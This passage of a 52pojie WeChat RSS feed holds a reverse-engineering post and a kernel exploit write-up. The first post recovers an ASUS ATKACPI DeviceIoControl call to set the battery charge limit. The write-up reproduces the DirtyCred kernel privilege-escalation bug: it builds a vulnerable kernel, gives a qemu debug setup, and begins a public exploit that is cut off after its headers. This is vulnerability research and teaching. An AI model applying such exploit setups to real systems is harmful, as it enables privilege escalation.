/><span>双击BhcApp.exe，启动充电保护软件。x64dbg附加“</span><span>BhcMgr.exe</span><span>”。</span><br /><span>在</span><span>DeviceIoControl</span><span>处插入断点，这个函数用于和设备通信，随便选中一个模式然后点确定就会触发断点。</span><br /><span>例如我选中的“平衡保养模式”。</span><br /><span>调用堆栈如下图所示。</span><br /><img class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=40366b9e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPfe9nM4Q6ARtwnD4lInM0nMCP4BZlZzCOkrSLyEUtgEXxIsG9LpIqIwg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="877" /><br /><br /><span>DeviceIoControl的参数如下：</span><br /></p><p></p><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js"><code><span class="code-snippet_outer"><span class="code-snippet__function">BOOL <span class="code-snippet__title">DeviceIoControl</span>(<span class="code-snippet__params"></span></span></span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>]                HANDLE       hDevice,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>]                DWORD        dwIoControlCode,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>, optional]      LPVOID       lpInBuffer,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>]                DWORD        nInBufferSize,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">out</span>, optional]     LPVOID       lpOutBuffer,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>]                DWORD        nOutBufferSize,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">out</span>, optional]     LPDWORD      lpBytesReturned,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>, <span class="code-snippet__keyword">out</span>, optional] LPOVERLAPPED lpOverlapped</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">)</span>;</span></code></pre><p></p><br /><p><br /><span>回到DeviceIoControl上层函数“sub_321C90”。观察DeviceIoControl的入参：</span><br /><img class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=49686a28&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPfJcn3I30ce7XsGEBghhmALhLV24jQuibjcz76OJcPnGPpIpKPzpudu0Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="1080" /><span></span><br /><br /><span>HANDLE hDevice = 0x274</span><br /><span>DWORD dwIoControlCode = 0x22240C</span><br /><span>LPVOID lpInBuffer = 0xB7F010</span><br /><span>DWORD nInBufferSize = 0x10</span><br /><span>LPVOID lpOutBuffer = 0x93F238</span><br /><span>DWORD nOutBufferSize = 0x400</span><br /><span>LPDWORD lpBytesReturned = 0x93F234</span><br /><span>LPOVERLAPPED lpOverlapped = 0</span><br /><br /><span><span style="font-size: 18px;">1.1 查看缓冲区lpInBuffer: 0xB7F010</span></span><br /><span>如下图所示为缓冲区内容，大小0x10字节。</span><br /><img class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=6eb8296a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPflsfSj6HhibzyBlgqUDiapxQ5FtlVm4dLDMfdm190R6icicTZU5EpRvZWdA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="621" /><span></span><br /><br /><span>这个可以视为一个结构体。代码如下。</span></p><p></p><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js"><code><span class="code-snippet_outer"><span class="code-snippet__class"><span class="code-snippet__keyword">struct</span> <span class="code-snippet__title">BatteryIOCtlInfo</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">        DWORD head; <span class="code-snippet__comment">// 头部</span></span></code><code><span class="code-snippet_outer">        DWORD nextSize; <span class="code-snippet__comment">// 后续结构体成员大小</span></span></code><code><span class="code-snippet_outer">        DWORD num2; <span class="code-snippet__comment">// 未知四字节数，固定为0x120057</span></span></code><code><span class="code-snippet_outer">        DWORD perecent; <span class="code-snippet__comment">// 充电百分比，0x50为80%，0x3C为60，0x64为100%</span></span></code><code><span class="code-snippet_outer">};</span></code></pre><p></p><br /><p><span></span></p><p><span>结构体各成员值填写为：</span></p><p></p><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js"><code><span class="code-snippet_outer">BatteryIOCtlInfo btinfo;</span></code><code><span class="code-snippet_outer">btinfo.head = <span class="code-snippet__number">0x53564544</span>;</span></code><code><span class="code-snippet_outer">btinfo.nextSize=<span class="code-snippet__number">8</span>;</span></code><code><span class="code-snippet_outer">btinfo.num2 = <span class="code-snippet__number">0x120057</span>;</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">// 0x3c 60%</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">// 0x50 80%</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">// 0x64 100%</span></span></code><code><span class="code-snippet_outer">btinfo.perecent = <span class="code-snippet__number">0x3c</span>;</span></code></pre><p></p><br /><p><br /></p><p><span>1.2 输出缓冲区lpOutBuffer: 0x93F238</span><br /><span>只有头四节被填充0x1，剩余的0x400 - 4个字节均为0.</span><br /><img class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=60fdcceb&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPfVZvBhlpx2ywicQXBVq7fJtTSVobiaLzSGD2Cb53rVwyOG8vKkrnyCq4A%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="646" /><br /><br /><span>输出缓冲区里的内容没有什么特别的，只需保证有输出缓冲区，以及该缓冲区有0x400字节大小即可。</span><br /><br /><span>2.IDA静态分析</span><br /><span>以上分析了DeviceIoControl的入参，但是还不知道设备句柄是怎么获取的。</span><br /><span>进入sub_321C90的代码段，在IDA为“</span><span>sub_401C90</span><span>”,00401D0C为调用DeviceIoControl的语句。</span><br /><img class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=38452642&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPft9dhND5hkxG2n3OwYdjPR9zGhtXFOLziaicIfwFaPP4phAAN1Svp5Qbg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="1012" /><br /><br /><span>选中"hDevice"，按下X键看看哪个语句写入了这个hDevice。如下图所示。（Type：r表示读取read，w表示写入write）</span><br /><img class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=bee37751&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPf4Q8fa09XicZ3zE1Obpa7uaibfQ6jOfw4QAib7dU8om8V6yM25PL5WFZjQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="647" /><br /><br /><span>进入了函数</span><span>sub_401D70。</span><br /><img class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=0306638f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPfK0CuEoicPdN298C8msYtp1M5U9sq12lxOun3la6nuHtQ6Lru0oicw18g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="1015" /><br /><br /><span>原来是CreateFileW打开（电池）设备的句柄。</span><br /><br /><span>CreateFileW参数如下：</span></p><p></p><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js"><code><span class="code-snippet_outer"><span class="code-snippet__type">HANDLE</span> <span class="code-snippet__type">CreateFileW</span>(</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>]           <span class="code-snippet__type">LPCWSTR</span>               lpFileName,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>]           <span class="code-snippet__type">DWORD</span>                 dwDesiredAccess,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>]           <span class="code-snippet__type">DWORD</span>                 dwShareMode,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>, <span class="code-snippet__keyword">optional</span>] <span class="code-snippet__type">LPSECURITY_ATTRIBUTES</span> lpSecurityAttributes,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>]           <span class="code-snippet__type">DWORD</span>                 dwCreationDisposition,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>]           <span class="code-snippet__type">DWORD</span>                 dwFlagsAndAttributes,</span></code><code><span class="code-snippet_outer">  [<span class="code-snippet__keyword">in</span>, <span class="code-snippet__keyword">optional</span>] <span class="code-snippet__type">HANDLE</span>                hTemplateFile</span></code><code><span class="code-snippet_outer">);</span></code></pre><p></p><br /><p><span></span></p><p><span>LPCWSTR lpFileName："\\.\ATKACPI"</span><br /><span>DWORD dwDesiredAccess: 0xC0000000 ( GENERIC_READ | GENERIC_WRITE == 0xC0000000 )</span><br /><span>DWORD dwShareMode: 0x3 (FILE_SHARE_READ | FILE_SHARE_WRITE == 0x3)</span><br /><span>LPSECURITY_ATTRIBUTES lpSecurityAttributes: NULL</span><br /><span>DWORD dwCreationDisposition: 0x3 (OPEN_EXISTING == 3)</span><br /><span>DWORD dwFlagsAndAttributes: NULL</span><br /><span>HANDLE hTemplateFile: NULL</span><br /><br /><span>3. 代码复现</span><br /><span>因此控制笔记本最高充电百分比的C++代码如下：</span><br /></p><p></p><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js"><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;stdio.h&gt;</span></span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;stdlib.h&gt;</span></span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;Windows.h&gt;</span></span></span></code><code><span class="code-snippet_outer"> </span></code><code><span class="code-snippet_outer"><span class="code-snippet__class"><span class="code-snippet__keyword">struct</span> <span class="code-snippet__title">BatteryIOCtlInfo</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">    DWORD head;</span></code><code><span class="code-snippet_outer">    DWORD nextSize;</span></code><code><span class="code-snippet_outer">    DWORD num2;</span></code><code><span class="code-snippet_outer">    DWORD perecent;</span></code><code><span class="code-snippet_outer">};</span></code><code><span class="code-snippet_outer"> </span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">int</span> <span class="code-snippet__title">main</span><span class="code-snippet__params">(<span class="code-snippet__keyword">int</span> argc, <span class="code-snippet__keyword">char</span>** argv, <span class="code-snippet__keyword">char</span>** envp)</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">// GENERIC_READ | GENERIC_WRITE == 0xC0000000</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">// FILE_SHARE_READ | FILE_SHARE_WRITE == 0x3</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">// OPEN_EXISTING == 3</span></span></code><code><span class="code-snippet_outer">    HANDLE hhh = CreateFileW</span></code><code><span class="code-snippet_outer">        (</span></code><code><span class="code-snippet_outer">            <span class="code-snippet__string">L"\\\\.\\ATKACPI"</span>, </span></code><code><span class="code-snippet_outer">            GENERIC_READ | GENERIC_WRITE,</span></code><code><span class="code-snippet_outer">            FILE_SHARE_READ | FILE_SHARE_WRITE, </span></code><code><span class="code-snippet_outer">            <span class="code-snippet__literal">NULL</span>,</span></code><code><span class="code-snippet_outer">            OPEN_EXISTING,</span></code><code><span class="code-snippet_outer">            <span class="code-snippet__literal">NULL</span>,</span></code><code><span class="code-snippet_outer">            <span class="code-snippet__literal">NULL</span></span></code><code><span class="code-snippet_outer">        );</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">//</span></span></code><code><span class="code-snippet_outer">    BatteryIOCtlInfo btinfo;</span></code><code><span class="code-snippet_outer">    btinfo.head = <span class="code-snippet__number">0x53564544</span>;</span></code><code><span class="code-snippet_outer">    btinfo.nextSize=<span class="code-snippet__number">8</span>;</span></code><code><span class="code-snippet_outer">    btinfo.num2 = <span class="code-snippet__number">0x120057</span>;</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">// 0x3c 60%</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">// 0x50 80%</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">// 0x64 100%</span></span></code><code><span class="code-snippet_outer">    btinfo.perecent = <span class="code-snippet__number">0x3c</span>;  <span class="code-snippet__comment">// 修改此处数值</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">// out buffer</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">void</span>* out_buf = <span class="code-snippet__built_in">malloc</span>(<span class="code-snippet__number">0x400</span>);</span></code><code><span class="code-snippet_outer">    DWORD returnBytes = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__comment">//</span></span></code><code><span class="code-snippet_outer">    DeviceIoControl(</span></code><code><span class="code-snippet_outer">        hhh,</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__number">0x22240C</span>,</span></code><code><span class="code-snippet_outer">        &amp;btinfo,</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">sizeof</span>(btinfo),</span></code><code><span class="code-snippet_outer">        out_buf,</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__number">0x400</span>,</span></code><code><span class="code-snippet_outer">        &amp;returnBytes,</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__literal">NULL</span>);</span></code><code><span class="code-snippet_outer">    CloseHandle(hhh);</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__built_in">free</span>(out_buf);</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">return</span> <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">}</span></code></pre><p></p><br /><p><br /><span>经测试可以修改最高充电百分比，但是只能有60%，80%和100%三种数值。<span style="color: #ff0000;">如果修改为其它数值，则默认</span></span><span><span style="color: #ff0000;">最高充电百分比为100%。</span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1902161-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Tue, 19 Mar 2024 16:10:09 +0800</pubDate>
<pubDate>Tue, 19 Mar 2024 16:10:09 +0800</pubDate>
</item>
<item>
<title>今日清除 开放注册 后一直未激活会员1320人，基本都是邮箱写错了的。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140294&amp;idx=1&amp;sn=522546657474998f6e54b8f9058ea084&amp;chksm=bd50a0928a2729848992803408fd71dc94116ac6f7449c1965cf072367bca930e4f99b31b399&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140294&amp;idx=1&amp;sn=522546657474998f6e54b8f9058ea084&amp;chksm=bd50a0928a2729848992803408fd71dc94116ac6f7449c1965cf072367bca930e4f99b31b399&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<div> 📅 日期：2024年3月18日
🕔 时间：17:05
📍 地点：北京

ℹ️ 消息：北京时间2024年3月18日下午5点05分

🌍 地点：北京

📌 关键信息：
1. 时间：2024年3月18日下午5点05分
2. 地点：北京

<br> <div>
<p>
<span></span> <span>2024-03-18 17:05</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>


                    
          <div class="share_media_text">
            <div class="share_media_text_fake" id="js_text_content_fake"></div>
            <div class="share_media_text_inner js_underline_content" id="js_text_content"></div>
                        &nbsp;<a></a>&nbsp;
                      </div>
]]></content:encoded>
<pubDate>Mon, 18 Mar 2024 17:04:44 +0800</pubDate>
<pubDate>Mon, 18 Mar 2024 17:04:44 +0800</pubDate>
</item>
<item>
<title>【漏洞分析】CVE-2021-4145 dirty cred漏洞复现</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140292&amp;idx=1&amp;sn=525c0180c43ad8028deadaa683e50c9d&amp;chksm=bd50a0908a272986b8d0075aadadf72cbc6c3af41c4d4bd5d0539b3613df059e240811370e67&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140292&amp;idx=1&amp;sn=525c0180c43ad8028deadaa683e50c9d&amp;chksm=bd50a0908a272986b8d0075aadadf72cbc6c3af41c4d4bd5d0539b3613df059e240811370e67&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[

<p>
原创 <span>吾爱pojie</span> <span>2024-03-16 09:25</span> <span style="display: inline-block;">北京</span>
</p>

<p>CVE-2021-4145 dirty cred漏洞复现，篇文章采用的还是 环境配置——漏洞验证——源码分析——代码调试 这四部分。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=d26cc433&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKpR3hJKfFjEos8pmltE6WLpyp7ZU6ohPRN8A1xy5uKFHaOLVTfsqc4A%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>xia0ji233</strong></p><br /><p><br /></p><br /><p>复现一下 dirty cred 漏洞</p><p>&lt;!--more--&gt;</p><p>同样本篇文章采用的还是 环境配置——漏洞验证——源码分析——代码调试 这四部分。</p><h2>环境配置</h2><h3>内核编译</h3><p>选用一个漏洞存在的版本，例如 5.13.2。</p><p>下面就是编译内核会踩得一些坑，我将完整复述一遍：</p><p>源码下载好之后，先 <code style="font-family: SFMono-Regular, Consolas, ;">make menuconfig</code> 开启调试符号，<code style="font-family: SFMono-Regular, Consolas, ;">kernel hacking-&gt;kernel debugging</code> 勾选，<code style="font-family: SFMono-Regular, Consolas, ;">kernel hacking-&gt;Compile-time checks and compiler options-&gt;Compile the kernel with debug info</code> 勾选。</p><p>保存退出之后还需要加上两个选项。</p><p><code style="font-family: SFMono-Regular, Consolas, ;">vim .config</code>，打开之后找到两个选项，一个是 <code style="font-family: SFMono-Regular, Consolas, ;">CONFIG_FUSE_FS</code> 另一个是 <code style="font-family: SFMono-Regular, Consolas, ;">CONFIG_USER_NS</code>，这两个选项都需要启动，默认生成的 <code style="font-family: SFMono-Regular, Consolas, ;">config</code> 应该是没有启用这两个选项的。</p><p>配置完成之后就可以开始编译了。</p><p>编译完成之后，在本目录下得到带完整符号的 <code style="font-family: SFMono-Regular, Consolas, ;">vmlinux</code>，在 <code style="font-family: SFMono-Regular, Consolas, ;">arch/x86/boot/</code> 得到启动内核 <code style="font-family: SFMono-Regular, Consolas, ;">bzImage</code></p><h3>文件系统编译</h3><p>依然是采用 busybox，方法和之前是一致的，看我最开始的环境搭建即可，这里可以提前把 EXP 编译进去然后打包文件系统。</p><h3>启动脚本</h3><p>就是传说中的 <code style="font-family: SFMono-Regular, Consolas, ;">start.sh</code></p><p>这里给大家参考一下我的 qemu 启动参数。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">qemu-system-x86_64 \<br />        -m 256M \<br />        -smp 2,cores=2,threads=1\<br />        -kernel ./bzImage \<br />        -initrd  ./rootfs.img \<br />        -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr"\<br />        -cpu qemu64 \<br />        -netdev user,id=t0, \<br />        -device e1000,netdev=t0,id=nic0 \<br />        -nographic \<br />        #-s -S\</code></pre><p>最后一行用于调试，大家不需要调试可以先注释掉，其它参数解释如下：</p><ol><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-m 256M</code>: 指定虚拟机的内存大小为 256MB。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-smp 2,cores=2,threads=1</code>: 指定使用 2 个 CPU，每个 CPU 拥有 2 个核心，每个核心只有一个线程。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-kernel ./bzImage</code>: 指定了内核文件。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-initrd ./rootfs.img</code>: 指定我们制作的 Linux 文件系统。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr"</code>:指定了传递给内核的启动参数。这里的 quiet 可以让内核不输出很多信息直接启动，<code style="font-family: SFMono-Regular, Consolas, ;">nokaslr</code> 一定要加，否则断点无法命中。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-cpu qemu64</code>: 指定使用 QEMU 的默认 x86_64 CPU 模拟器。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-netdev user,id=t0,</code>: 指定了用户模式网络设备。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-device e1000,netdev=t0,id=nic0</code>: 指定了要添加到虚拟机的网络设备。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-nographic</code>: 无需图形界面的情况下运行 QEMU。</p></li></ol><hr /><p>现在在目录下应该有了 <code style="font-family: SFMono-Regular, Consolas, ;">start.sh</code>，<code style="font-family: SFMono-Regular, Consolas, ;">bzImage</code> 和 <code style="font-family: SFMono-Regular, Consolas, ;">rootfs.img</code>，文件系统可以提前打包 exp 进去。</p><h2>漏洞验证</h2><h3>EXP验证</h3><p>用网上通用的一个 EXP。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">define</span> _GNU_SOURCE</span><br /><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;endian.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;errno.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;fcntl.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sched.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdarg.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdbool.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdint.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdlib.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;string.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/mman.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/mount.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;sys/prctl.h&gt;</span></span><br 